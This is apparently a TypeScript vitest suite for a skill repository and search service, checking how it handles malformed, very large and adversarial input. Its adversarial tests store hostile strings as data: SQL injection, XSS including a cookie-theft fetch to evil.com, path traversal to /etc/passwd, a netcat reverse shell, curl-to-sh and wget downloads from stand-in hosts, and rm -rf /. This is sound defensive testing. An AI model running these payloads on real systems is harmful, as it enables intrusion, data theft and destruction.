/**
 * SMI-868: Edge Case Test Suite
 *
 * Comprehensive tests for edge cases including:
 * - Malformed data handling
 * - Large data processing
 * - Adversarial inputs (SQL injection, XSS, path traversal, etc.)
 * - Network error simulation
 *
 * Uses expect().not.toThrow() pattern for graceful degradation tests.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { createDatabase, closeDatabase } from '../../src/db/schema.js'
import { SkillRepository } from '../../src/repositories/SkillRepository.js'
import { SearchService } from '../../src/services/SearchService.js'
import { SkillParser } from '../../src/indexer/SkillParser.js'
import type { SkillCreateInput } from '../../src/types/skill.js'

describe('SMI-868: Edge Case Test Suite', () => {
  let db: ReturnType<typeof createDatabase>
  let repo: SkillRepository
  let search: SearchService
  let parser: SkillParser

  beforeEach(() => {
    db = createDatabase(':memory:')
    repo = new SkillRepository(db)
    search = new SearchService(db, { cacheTtl: 0 })
    parser = new SkillParser()
  })

  afterEach(() => {
    if (db) closeDatabase(db)
  })

  // ============================================================================
  // 1. MALFORMED DATA TESTS
  // ============================================================================
  describe('Malformed Data', () => {
    describe('Missing Required Fields', () => {
      it('should handle skill creation with missing name gracefully', () => {
        const invalidSkill = {
          description: 'A skill without a name',
          author: 'test-author',
        } as SkillCreateInput

        // Should throw or return error, not crash
        expect(() => {
          try {
            repo.create(invalidSkill)
          } catch {
            // Expected - name is required
          }
        }).not.toThrow()
      })

      it('should handle skill creation with null/undefined fields', () => {
        const skillWithNulls: SkillCreateInput = {
          name: 'test-skill',
          description: null,
          author: null,
          repoUrl: null,
          qualityScore: null,
          tags: undefined,
        }

        expect(() => repo.create(skillWithNulls)).not.toThrow()
        const created = repo.create({
          name: 'valid-skill',
          description: undefined,
          author: undefined,
        })
        expect(created).toBeDefined()
        expect(created.id).toBeDefined()
      })

      it('should handle empty object creation attempt', () => {
        expect(() => {
          try {
            repo.create({} as SkillCreateInput)
          } catch {
            // Expected
          }
        }).not.toThrow()
      })
    })

    describe('Invalid JSON in SKILL.md', () => {
      it('should handle SKILL.md with malformed frontmatter', () => {
        const malformedContents = [
          '--- invalid yaml ---', // Missing closing delimiter
          '---\n{invalid: json, broken}\n---', // Invalid YAML structure
          '---\nname: test\ndescription: [unclosed array\n---', // Unclosed array
          '---\nname:\n  - nested: {broken\n---', // Broken nested structure
          'no frontmatter at all', // Missing frontmatter entirely
          '---\n---', // Empty frontmatter
          '------\nname: test\n------', // Wrong delimiters
        ]

        for (const content of malformedContents) {
          expect(() => parser.parse(content)).not.toThrow()
          const result = parser.parse(content)
          // Should return null for invalid content, not crash
          expect(result === null || typeof result === 'object').toBe(true)
        }
      })

      it('should handle SKILL.md with truncated content', () => {
        const truncated = '---\nname: te'
        expect(() => parser.parse(truncated)).not.toThrow()
      })

      it('should handle binary garbage in SKILL.md', () => {
        const binaryGarbage = Buffer.from([0x00, 0x01, 0x02, 0xff, 0xfe, 0xfd]).toString()
        expect(() => parser.parse(binaryGarbage)).not.toThrow()
      })
    })

    describe('Extremely Long Descriptions (>10KB)', () => {
      it('should handle descriptions over 10KB', () => {
        const longDescription = 'A'.repeat(15000) // 15KB description

        const skill: SkillCreateInput = {
          name: 'long-description-skill',
          description: longDescription,
        }

        expect(() => repo.create(skill)).not.toThrow()
        const created = repo.create({
          name: 'another-long-desc-skill',
          description: longDescription,
        })
        expect(created).toBeDefined()
      })

      it('should handle 50KB descriptions in search', () => {
        const hugeDescription = 'searchable '.repeat(5000) // ~50KB

        repo.create({
          name: 'huge-description-skill',
          description: hugeDescription,
        })

        expect(() => search.search({ query: 'searchable' })).not.toThrow()
      })
    })

    describe('Unicode and Emoji in Names', () => {
      it('should handle emoji in skill names', () => {
        const emojiSkills: SkillCreateInput[] = [
          { name: 'rocket-skill-\u{1F680}', description: 'A rocket skill' },
          { name: '\u{1F4A1}-idea-skill', description: 'An idea skill' },
          { name: 'skill-\u{1F525}-fire', description: 'A fire skill' },
          { name: '\u{1F600}\u{1F601}\u{1F602}', description: 'All emojis' },
          { name: 'combo-\u{1F1FA}\u{1F1F8}', description: 'Flag emoji' },
        ]

        for (const skill of emojiSkills) {
          expect(() => repo.create(skill)).not.toThrow()
        }
      })

      it('should handle various unicode scripts', () => {
        const unicodeSkills: SkillCreateInput[] = [
          { name: '\u4E2D\u6587-skill', description: 'Chinese characters' }, // Chinese
          { name: '\u0420\u0443\u0441\u0441\u043A\u0438\u0439-skill', description: 'Russian' }, // Russian
          { name: '\u65E5\u672C\u8A9E-skill', description: 'Japanese' }, // Japanese
          { name: '\uD55C\uAD6D\uC5B4-skill', description: 'Korean' }, // Korean
          { name: '\u0639\u0631\u0628\u064A-skill', description: 'Arabic' }, // Arabic
          { name: '\u05E2\u05D1\u05E8\u05D9\u05EA-skill', description: 'Hebrew' }, // Hebrew
          { name: '\u0E44\u0E17\u0E22-skill', description: 'Thai' }, // Thai
          { name: '\u0CA8\u0CCD\u0CA8\u0CA1-skill', description: 'Kannada' }, // Kannada
        ]

        for (const skill of unicodeSkills) {
          expect(() => repo.create(skill)).not.toThrow()
        }
      })

      it('should handle zero-width characters', () => {
        const zeroWidthSkills: SkillCreateInput[] = [
          { name: 'skill\u200B\u200Bname', description: 'Zero-width space' }, // Zero-width space
          { name: 'skill\u200Cname', description: 'Zero-width non-joiner' }, // ZWNJ
          { name: 'skill\u200Dname', description: 'Zero-width joiner' }, // ZWJ
          { name: 'skill\uFEFFname', description: 'BOM character' }, // BOM
        ]

        for (const skill of zeroWidthSkills) {
          expect(() => repo.create(skill)).not.toThrow()
        }
      })
    })

    describe('Control Characters', () => {
      it('should handle ASCII control characters in input', () => {
        const controlChars = [
          '\x00', // NULL
          '\x01', // SOH
          '\x02', // STX
          '\x03', // ETX
          '\x07', // BEL
          '\x08', // BS
          '\x09', // TAB (should be allowed)
          '\x0A', // LF (should be allowed)
          '\x0B', // VT
          '\x0C', // FF
          '\x0D', // CR (should be allowed)
          '\x1B', // ESC
          '\x7F', // DEL
        ]

        for (const char of controlChars) {
          const skill: SkillCreateInput = {
            name: `skill${char}test`,
            description: `Description with ${char} control char`,
          }
          expect(() => {
            try {
              repo.create(skill)
            } catch {
              // Some control chars may be rejected
            }
          }).not.toThrow()
        }
      })

      it('should handle ANSI escape sequences', () => {
        const ansiSequences = [
          '\x1B[31mred\x1B[0m',
          '\x1B[1mbold\x1B[0m',
          '\x1B[4munderline\x1B[0m',
          '\x1B[?25h', // Show cursor
          '\x1B[2J', // Clear screen
        ]

        for (const seq of ansiSequences) {
          const skill: SkillCreateInput = {
            name: `ansi-skill-${Buffer.from(seq).toString('hex')}`,
            description: `Contains ANSI: ${seq}`,
          }
          expect(() => repo.create(skill)).not.toThrow()
        }
      })
    })
  })

  // ============================================================================
  // 2. LARGE DATA TESTS
  // ============================================================================
  describe('Large Data', () => {
    describe('50KB SKILL.md Files', () => {
      it('should parse 50KB SKILL.md content', () => {
        const largeDescription = 'Lorem ipsum dolor sit amet. '.repeat(2000) // ~50KB
        const largeContent = `---
name: large-skill
description: ${largeDescription}
author: test-author
version: 1.0.0
tags:
  - large
  - test
---

# Large Skill

${largeDescription}
`

        const startTime = performance.now()
        expect(() => parser.parse(largeContent)).not.toThrow()
        const duration = performance.now() - startTime

        // Should complete in reasonable time (under 1 second)
        expect(duration).toBeLessThan(1000)
      })

      it('should handle 100KB SKILL.md files', () => {
        const hugeContent = 'x'.repeat(100000) // 100KB
        const content = `---
name: huge-skill
description: A huge skill
---

${hugeContent}
`
        expect(() => parser.parse(content)).not.toThrow()
      })
    })

    describe('100+ Dependencies', () => {
      it('should handle skills with 100+ dependencies', () => {
        const manyDependencies = Array.from({ length: 150 }, (_, i) => `dep-${i}`)
        const content = `---
name: many-deps-skill
description: A skill with many dependencies
dependencies:
${manyDependencies.map((d) => `  - ${d}`).join('\n')}
---

# Many Dependencies Skill
`
        expect(() => parser.parse(content)).not.toThrow()
        const result = parser.parse(content)
        expect(result).not.toBeNull()
        if (result) {
          expect(result.dependencies.length).toBe(150)
        }
      })

      it('should handle nested dependency structures', () => {
        const content = `---
name: nested-deps
dependencies:
  - dep-1
  - dep-2
  - dep-3
---`

        expect(() => parser.parse(content)).not.toThrow()
      })
    })

    describe('1000+ Tags', () => {
      it('should handle skills with 1000+ tags', () => {
        const manyTags = Array.from({ length: 1000 }, (_, i) => `tag-${i}`)

        const skill: SkillCreateInput = {
          name: 'many-tags-skill',
          description: 'A skill with many tags',
          tags: manyTags,
        }

        expect(() => repo.create(skill)).not.toThrow()
      })

      it('should search efficiently with 1000+ tags', () => {
        const manyTags = Array.from({ length: 1000 }, (_, i) => `searchable-tag-${i}`)

        repo.create({
          name: 'searchable-tags-skill',
          description: 'Searchable skill',
          tags: manyTags,
        })

        const startTime = performance.now()
        expect(() => search.search({ query: 'searchable-tag-500' })).not.toThrow()
        const duration = performance.now() - startTime

        // Should complete in reasonable time
        expect(duration).toBeLessThan(500)
      })

      it('should handle SKILL.md with 1000+ inline tags', () => {
        const manyTags = Array.from({ length: 1000 }, (_, i) => `t${i}`).join(', ')
        const content = `---
name: inline-tags
tags: [${manyTags}]
---`

        expect(() => parser.parse(content)).not.toThrow()
      })
    })

    describe('Bulk Operations', () => {
      it('should handle batch creation of 500 skills', () => {
        const skills: SkillCreateInput[] = Array.from({ length: 500 }, (_, i) => ({
          name: `bulk-skill-${i}`,
          description: `Bulk created skill number ${i}`,
          tags: [`bulk`, `test-${i % 10}`],
        }))

        const startTime = performance.now()
        expect(() => repo.createBatch(skills)).not.toThrow()
        const duration = performance.now() - startTime

        // Should complete batch in reasonable time (under 5 seconds)
        expect(duration).toBeLessThan(5000)
      })

      it('should handle search across 1000 skills', () => {
        // Create 1000 skills
        const skills: SkillCreateInput[] = Array.from({ length: 1000 }, (_, i) => ({
          name: `searchable-skill-${i}`,
          description: `A searchable skill for testing large datasets. Index: ${i}`,
          tags: ['searchable', `group-${i % 50}`],
        }))

        repo.createBatch(skills)

        const startTime = performance.now()
        const results = search.search({ query: 'searchable', limit: 100 })
        const duration = performance.now() - startTime

        expect(results.items.length).toBeLessThanOrEqual(100)
        expect(duration).toBeLessThan(200)
      })
    })
  })

  // ============================================================================
  // 3. ADVERSARIAL INPUTS
  // ============================================================================
  describe('Adversarial Inputs', () => {
    describe('SQL Injection in Name (Verify Parameterized Queries)', () => {
      it('should safely handle SQL injection attempts in skill name', () => {
        const sqlInjectionPayloads = [
          "'; DROP TABLE skills; --",
          "' OR '1'='1",
          "'; DELETE FROM skills WHERE '1'='1",
          "1; UPDATE skills SET name='hacked'",
          "' UNION SELECT * FROM skills--",
          "'; INSERT INTO skills VALUES('malicious','hacked',NULL)--",
          "admin'--",
          "' OR 1=1--",
          "'); DROP TABLE skills; --",
          "1' OR '1' = '1' /*",
          "' OR ''='",
          "'; EXEC xp_cmdshell('cmd.exe'); --",
          '0x27204F52202731273D2731', // Hex encoded
        ]

        for (const payload of sqlInjectionPayloads) {
          const skill: SkillCreateInput = {
            name: payload,
            description: 'Testing SQL injection',
          }

          // Should not throw - parameterized queries should handle this
          expect(() => repo.create(skill)).not.toThrow()
        }

        // Verify database is still intact
        const results = search.search({ query: 'Testing' })
        expect(results).toBeDefined()
      })

      it('should safely handle SQL injection in search queries', () => {
        const sqlPayloads = [
          "test' OR '1'='1",
          "'; DROP TABLE skills;--",
          'test UNION SELECT * FROM skills',
          '1 AND 1=1',
        ]

        for (const payload of sqlPayloads) {
          // FTS5 may throw syntax errors on special chars - that's safe behavior
          // The key is that it doesn't execute SQL injection, just rejects bad syntax
          expect(() => {
            try {
              search.search({ query: payload })
            } catch (e) {
              // SqliteError for FTS5 syntax is acceptable (graceful rejection)
              if (e instanceof Error && e.message.includes('fts5')) {
                return // FTS5 syntax error is safe
              }
              throw e // Re-throw unexpected errors
            }
          }).not.toThrow()
        }
      })

      it('should safely handle SQL injection in author field', () => {
        const skill: SkillCreateInput = {
          name: 'safe-skill',
          author: "'; DROP TABLE skills;--",
          description: 'Testing author injection',
        }

        expect(() => repo.create(skill)).not.toThrow()
      })
    })

    describe('XSS in Description', () => {
      it('should store XSS payloads without executing', () => {
        const xssPayloads = [
          '<script>alert("xss")</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '"><script>alert(String.fromCharCode(88,83,83))</script>',
          "javascript:alert('XSS')",
          '<body onload=alert(1)>',
          '<iframe src="javascript:alert(1)">',
          '<a href="javascript:alert(1)">click</a>',
          "'-alert(1)-'",
          '<img src="x" onerror="alert(1)">',
          '<div style="background:url(javascript:alert(1))">',
          '{{constructor.constructor("alert(1)")()}}', // Template injection
          '<script>fetch("evil.com?cookie="+document.cookie)</script>',
          '<input onfocus=alert(1) autofocus>',
          '<marquee onstart=alert(1)>',
        ]

        for (const payload of xssPayloads) {
          const skill: SkillCreateInput = {
            name: `xss-test-${Buffer.from(payload).toString('hex').slice(0, 20)}`,
            description: payload,
          }

          expect(() => repo.create(skill)).not.toThrow()
        }

        // Verify payloads are stored as data, not executed
        const results = search.search({ query: 'script' })
        expect(results).toBeDefined()
      })

      it('should handle XSS in tags', () => {
        const skill: SkillCreateInput = {
          name: 'xss-tags-skill',
          tags: [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert('xss')",
          ],
        }

        expect(() => repo.create(skill)).not.toThrow()
      })
    })

    describe('Path Traversal in ID', () => {
      it('should reject or sanitize path traversal in skill IDs', () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config',
          '....//....//....//etc/passwd',
          '.../.../.../etc/passwd',
          '..%2F..%2F..%2Fetc%2Fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd',
          '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....\\....\\....\\etc\\passwd',
          '..//..//..//etc/passwd',
          'skill/../../../etc/passwd',
        ]

        for (const payload of pathTraversalPayloads) {
          const skill: SkillCreateInput = {
            id: payload,
            name: 'path-traversal-test',
            description: 'Testing path traversal',
          }

          // Should not throw - should handle gracefully
          expect(() => {
            try {
              repo.create(skill)
            } catch {
              // May reject invalid IDs
            }
          }).not.toThrow()
        }
      })

      it('should handle path traversal in repo URL', () => {
        const skill: SkillCreateInput = {
          name: 'url-traversal-skill',
          repoUrl: 'file:///../../../etc/passwd',
        }

        expect(() => repo.create(skill)).not.toThrow()
      })
    })

    describe('Prototype Pollution', () => {
      it('should not be vulnerable to prototype pollution via __proto__', () => {
        const pollutionPayloads = [
          { name: '__proto__', description: 'Pollution attempt' },
          { name: 'constructor', description: 'Constructor pollution' },
          { name: 'prototype', description: 'Prototype pollution' },
        ]

        for (const payload of pollutionPayloads) {
          expect(() => repo.create(payload as SkillCreateInput)).not.toThrow()
        }

        // Verify Object prototype is not polluted
        expect(({} as Record<string, unknown>).polluted).toBeUndefined()
      })

      it('should handle __proto__ in JSON-like fields', () => {
        const content = `---
name: proto-test
__proto__:
  polluted: true
constructor:
  prototype:
    isAdmin: true
---`

        expect(() => parser.parse(content)).not.toThrow()

        // Verify no pollution
        expect(({} as Record<string, unknown>).polluted).toBeUndefined()
        expect(({} as Record<string, unknown>).isAdmin).toBeUndefined()
      })

      it('should handle deeply nested pollution attempts', () => {
        const skill: SkillCreateInput = {
          name: 'nested-pollution',
          description: '{"__proto__": {"polluted": true}}',
          tags: ['__proto__', 'constructor', 'prototype'],
        }

        expect(() => repo.create(skill)).not.toThrow()
        expect(({} as Record<string, unknown>).polluted).toBeUndefined()
      })
    })

    describe('Command Injection Patterns', () => {
      it('should safely store command injection patterns', () => {
        const commandInjectionPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '`whoami`',
          '$(whoami)',
          '&& rm -rf /',
          '; echo "pwned" > /tmp/pwned',
          '| nc attacker.com 4444 -e /bin/sh',
          '; curl http://evil.com/shell.sh | sh',
          '`id`',
          '$(`id`)',
          "'; /bin/bash -i",
          '|| wget http://evil.com/malware',
          '\n/bin/bash',
          '\x00/bin/sh',
          '{{7*7}}', // SSTI
          '${7*7}', // SSTI
          '#{7*7}', // SSTI
          '<%= system("whoami") %>', // ERB injection
        ]

        for (const payload of commandInjectionPayloads) {
          const skill: SkillCreateInput = {
            name: `cmd-test-${commandInjectionPayloads.indexOf(payload)}`,
            description: payload,
          }

          expect(() => repo.create(skill)).not.toThrow()
        }
      })

      it('should handle command injection in SKILL.md parsing', () => {
        const content = `---
name: $(whoami)
author: \`id\`
description: |
  ; rm -rf /
  | cat /etc/passwd
  && echo pwned
---`

        expect(() => parser.parse(content)).not.toThrow()
      })
    })

    describe('ReDoS (Regular Expression Denial of Service)', () => {
      it('should handle ReDoS payloads in search queries', () => {
        const redosPayloads = [
          'a'.repeat(50) + '!',
          'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab',
          'x'.repeat(100) + 'y',
          '(a+)+b'.repeat(10),
          '((a+)+)+'.repeat(5),
        ]

        for (const payload of redosPayloads) {
          const startTime = performance.now()
          // FTS5 may throw syntax errors on special chars like ! or parentheses
          // The key is that it completes quickly (no ReDoS hang)
          expect(() => {
            try {
              search.search({ query: payload })
            } catch (e) {
              // SqliteError for FTS5 syntax is acceptable (quick rejection)
              if (e instanceof Error && e.message.includes('fts5')) {
                return // FTS5 syntax error is safe and quick
              }
              throw e // Re-throw unexpected errors
            }
          }).not.toThrow()
          const duration = performance.now() - startTime

          // Should complete quickly, not hang
          expect(duration).toBeLessThan(1000)
        }
      })

      it('should handle ReDoS in skill names', () => {
        const skill: SkillCreateInput = {
          name: 'a'.repeat(10000),
          description: 'ReDoS test',
        }

        const startTime = performance.now()
        expect(() => repo.create(skill)).not.toThrow()
        const duration = performance.now() - startTime

        expect(duration).toBeLessThan(1000)
      })
    })

    describe('Buffer Overflow Patterns', () => {
      it('should handle very long strings without crashing', () => {
        const lengths = [1000, 10000, 100000, 1000000]

        for (const len of lengths) {
          const longString = 'A'.repeat(len)
          const skill: SkillCreateInput = {
            name: `long-${len}`,
            description: longString,
          }

          expect(() => repo.create(skill)).not.toThrow()
        }
      })

      it('should handle format string attacks', () => {
        const formatStrings = [
          '%s%s%s%s%s%s%s%s%s%s',
          '%x%x%x%x%x%x%x%x%x%x',
          '%n%n%n%n%n%n%n%n%n%n',
          '%d%d%d%d%d%d%d%d%d%d',
          '%.10000000s',
          '%99999999s',
        ]

        for (const payload of formatStrings) {
          const skill: SkillCreateInput = {
            name: `format-${formatStrings.indexOf(payload)}`,
            description: payload,
          }

          expect(() => repo.create(skill)).not.toThrow()
        }
      })
    })
  })

  // ============================================================================
  // 4. NETWORK ERROR SIMULATION
  // ============================================================================
  describe('Network Errors', () => {
    describe('Rate Limit Simulation', () => {
      it('should handle rapid sequential operations', () => {
        const operations = 100

        const startTime = performance.now()
        for (let i = 0; i < operations; i++) {
          expect(() =>
            repo.create({
              name: `rapid-skill-${i}`,
              description: 'Rapid creation test',
            })
          ).not.toThrow()
        }
        const duration = performance.now() - startTime

        // Should handle 100 ops reasonably
        expect(duration).toBeLessThan(5000)
      })

      it('should handle burst search operations', () => {
        // Create some skills first
        repo.createBatch(
          Array.from({ length: 50 }, (_, i) => ({
            name: `burst-skill-${i}`,
            description: 'Burst test skill',
          }))
        )

        const searchCount = 50
        const startTime = performance.now()

        for (let i = 0; i < searchCount; i++) {
          expect(() => search.search({ query: 'burst' })).not.toThrow()
        }

        const duration = performance.now() - startTime
        // 50 searches should complete quickly with caching
        expect(duration).toBeLessThan(2000)
      })
    })

    describe('Timeout Handling', () => {
      it('should handle very complex queries within timeout', () => {
        // Create skills with varied content
        repo.createBatch(
          Array.from({ length: 200 }, (_, i) => ({
            name: `complex-skill-${i}`,
            description: `This is a complex skill with many words for testing ${i}`,
            tags: Array.from({ length: 20 }, (_, j) => `tag-${i}-${j}`),
          }))
        )

        const complexQueries = [
          'complex skill testing words many',
          'tag tag tag tag tag',
          'a b c d e f g h i j k l m n o p',
        ]

        for (const query of complexQueries) {
          const startTime = performance.now()
          expect(() => search.search({ query })).not.toThrow()
          const duration = performance.now() - startTime

          // Should complete within reasonable time
          expect(duration).toBeLessThan(1000)
        }
      })
    })

    describe('Partial Response Handling', () => {
      it('should handle pagination at data boundaries', () => {
        // Create exactly 25 skills
        repo.createBatch(
          Array.from({ length: 25 }, (_, i) => ({
            name: `boundary-skill-${i}`,
            description: 'Boundary test',
          }))
        )

        // Test various pagination scenarios
        const scenarios = [
          { limit: 10, offset: 0 }, // First page
          { limit: 10, offset: 10 }, // Second page
          { limit: 10, offset: 20 }, // Partial last page
          { limit: 10, offset: 25 }, // Empty page
          { limit: 10, offset: 30 }, // Beyond data
          { limit: 100, offset: 0 }, // More than available
          { limit: 1, offset: 24 }, // Single item at end
        ]

        for (const scenario of scenarios) {
          expect(() =>
            search.search({
              query: 'boundary',
              ...scenario,
            })
          ).not.toThrow()
        }
      })

      it('should handle zero limit gracefully', () => {
        expect(() => search.search({ query: 'test', limit: 0 })).not.toThrow()
      })

      it('should handle negative offset gracefully', () => {
        expect(() => {
          try {
            search.search({ query: 'test', offset: -1 })
          } catch {
            // May throw validation error
          }
        }).not.toThrow()
      })
    })

    describe('Concurrent Operations', () => {
      it('should handle concurrent reads and writes', async () => {
        // Create base skills
        repo.createBatch(
          Array.from({ length: 20 }, (_, i) => ({
            name: `concurrent-skill-${i}`,
            description: 'Concurrent test',
          }))
        )

        // Simulate concurrent operations (synchronous but interleaved)
        const operations: (() => void)[] = []

        for (let i = 0; i < 10; i++) {
          operations.push(() => search.search({ query: 'concurrent' }))
          operations.push(() =>
            repo.create({
              name: `new-concurrent-${i}`,
              description: 'New concurrent skill',
            })
          )
        }

        for (const op of operations) {
          expect(op).not.toThrow()
        }
      })
    })
  })

  // ============================================================================
  // 5. BOUNDARY CONDITIONS
  // ============================================================================
  describe('Boundary Conditions', () => {
    describe('Empty and Whitespace Inputs', () => {
      it('should handle empty string search', () => {
        expect(() => {
          try {
            search.search({ query: '' })
          } catch {
            // May throw validation error for empty query
          }
        }).not.toThrow()
      })

      it('should handle whitespace-only inputs', () => {
        const whitespaceInputs = ['   ', '\t\t\t', '\n\n\n', '\r\n\r\n', '   \t\n   ']

        for (const input of whitespaceInputs) {
          expect(() => {
            try {
              search.search({ query: input })
            } catch {
              // May throw validation error
            }
          }).not.toThrow()
        }
      })
    })

    describe('Numeric Boundaries', () => {
      it('should handle quality score boundaries', () => {
        const scores = [0, 0.5, 1, -0.1, 1.1, Number.MAX_VALUE, Number.MIN_VALUE, NaN, Infinity]

        for (const score of scores) {
          expect(() => {
            try {
              repo.create({
                name: `score-${scores.indexOf(score)}`,
                qualityScore: score,
              })
            } catch {
              // May reject invalid scores
            }
          }).not.toThrow()
        }
      })

      it('should handle limit/offset boundaries', () => {
        const values = [
          Number.MAX_SAFE_INTEGER,
          Number.MIN_SAFE_INTEGER,
          2147483647, // Max 32-bit signed int
          -2147483648, // Min 32-bit signed int
        ]

        for (const val of values) {
          expect(() => {
            try {
              search.search({ query: 'test', limit: val })
            } catch {
              // May reject extreme values
            }
          }).not.toThrow()
        }
      })
    })

    describe('Date/Time Edge Cases', () => {
      it('should handle skills with extreme timestamps', () => {
        // Skills will have auto-generated timestamps, but we can test retrieval
        const skill = repo.create({
          name: 'timestamp-test',
          description: 'Testing timestamps',
        })

        expect(skill.createdAt).toBeDefined()
        expect(skill.updatedAt).toBeDefined()
      })
    })
  })
})
